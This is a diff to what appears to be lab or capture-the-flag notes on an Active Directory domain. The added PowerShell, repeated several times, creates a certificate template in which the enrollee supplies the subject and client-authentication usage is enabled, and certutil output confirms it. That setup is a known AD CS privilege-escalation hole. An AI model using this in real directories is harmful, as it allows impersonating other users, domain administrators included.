@@ -1855,3 +1855,56 @@ RemoteAccessVPN EmployeeAuthTemplate VPNUserTemplate DirectoryEmailReplication D
 
 
 ```
+
+command:
+
+``` powershell
+
+C:\>powershell -c "Import-Module ActiveDirectory; $src = Get-ADObject 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -Properties msPKI-Cert-Template-OID,msPKI-Enrollment-Flag,pKIExtendedKeyUsage,pKIExpirationPeriod,pKIOverlapPeriod,pKIDefaultKeySpec,pKIMaxIssuingDepth; New-ADObject -Name 'VPNUserTemplate' -Type pKICertificateTemplate -Path 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -OtherAttributes @{'msPKI-Cert-Template-OID'=[string]$src.'msPKI-Cert-Template-OID';'msPKI-Certificate-Name-Flag'=1;'msPKI-Enrollment-Flag'=[int]$src.'msPKI-Enrollment-Flag';'msPKI-RA-Signature'=0;'msPKI-Template-Schema-Version'=2;'msPKI-Minimal-Key-Size'=2048;'pKIMaxIssuingDepth'=0;'pKIDefaultKeySpec'=1;'pKIExtendedKeyUsage'=[string[]]$src.pKIExtendedKeyUsage;'pKIExpirationPeriod'=[byte[]]$src.pKIExpirationPeriod;'pKIOverlapPeriod'=[byte[]]$src.pKIOverlapPeriod}"
+
+```
+
+``` powershell
+
+C:\>powershell -c "Import-Module ActiveDirectory; $src = Get-ADObject 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -Properties msPKI-Cert-Template-OID,msPKI-Enrollment-Flag,pKIExtendedKeyUsage,pKIExpirationPeriod,pKIOverlapPeriod,pKIDefaultKeySpec,pKIMaxIssuingDepth; New-ADObject -Name 'VPNUserTemplate' -Type pKICertificateTemplate -Path 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -OtherAttributes @{'msPKI-Cert-Template-OID'=[string]$src.'msPKI-Cert-Template-OID';'msPKI-Certificate-Name-Flag'=1;'msPKI-Enrollment-Flag'=[int]$src.'msPKI-Enrollment-Flag';'msPKI-RA-Signature'=0;'msPKI-Template-Schema-Version'=2;'msPKI-Minimal-Key-Size'=2048;'pKIMaxIssuingDepth'=0;'pKIDefaultKeySpec'=1;'pKIExtendedKeyUsage'=[string[]]$src.pKIExtendedKeyUsage;'pKIExpirationPeriod'=[byte[]]$src.pKIExpirationPeriod;'pKIOverlapPeriod'=[byte[]]$src.pKIOverlapPeriod}"
+powershell -c "Import-Module ActiveDirectory; $src = Get-ADObject 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -Properties msPKI-Cert-Template-OID,msPKI-Enrollment-Flag,pKIExtendedKeyUsage,pKIExpirationPeriod,pKIOverlapPeriod,pKIDefaultKeySpec,pKIMaxIssuingDepth; New-ADObject -Name 'VPNUserTemplate' -Type pKICertificateTemplate -Path 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -OtherAttributes @{'msPKI-Cert-Template-OID'=[string]$src.'msPKI-Cert-Template-OID';'msPKI-Certificate-Name-Flag'=1;'msPKI-Enrollment-Flag'=[int]$src.'msPKI-Enrollment-Flag';'msPKI-RA-Signature'=0;'msPKI-Template-Schema-Version'=2;'msPKI-Minimal-Key-Size'=2048;'pKIMaxIssuingDepth'=0;'pKIDefaultKeySpec'=1;'pKIExtendedKeyUsage'=[string[]]$src.pKIExtendedKeyUsage;'pKIExpirationPeriod'=[byte[]]$src.pKIExpirationPeriod;'pKIOverlapPeriod'=[byte[]]$src.pKIOverlapPeriod}"
+
+C:\>certutil -dsTemplate VPNUserTemplate
+certutil -dsTemplate VPNUserTemplate
+[Version]
+Signature = "$Windows NT$"
+
+
+[VPNUserTemplate]
+    objectClass = "top", "pKICertificateTemplate"
+    cn = "VPNUserTemplate"
+    distinguishedName = "CN=VPNUserTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"
+    instanceType = "4"
+    whenCreated = "20260827062436.0Z"
+    whenChanged = "20260827062436.0Z"
+    uSNCreated = "192737"
+    uSNChanged = "192737"
+    showInAdvancedViewOnly = "TRUE"
+    nTSecurityDescriptor = "D:AI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4220238332-57023728-1129110646-519)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;DA)"
+    name = "VPNUserTemplate"
+    objectGUID = "4ad0832b-46c0-4eae-b049-ac5f1fd7f59b"
+    objectCategory = "CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=danglingtree,DC=htb"
+    pKIDefaultKeySpec = "1"
+    pKIMaxIssuingDepth = "0"
+    pKIExpirationPeriod =  "1 Years"
+    pKIOverlapPeriod =  "6 Weeks"
+    pKIExtendedKeyUsage = "1.3.6.1.5.5.7.3.2", "1.3.6.1.5.5.7.3.4", "1.3.6.1.4.1.311.10.3.4"
+    dSCorePropagationData = "16010101000000.0Z"
+    msPKI-RA-Signature = "0"
+    msPKI-Enrollment-Flag = "41"
+    msPKI-Certificate-Name-Flag = "1"
+    msPKI-Minimal-Key-Size = "2048"
+    msPKI-Template-Schema-Version = "2"
+    msPKI-Cert-Template-OID = "1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.1.1"
+
+
+[TemplateList]
+    Template = "VPNUserTemplate"
+CertUtil: -dsTemplate command completed successfully.
+
+```
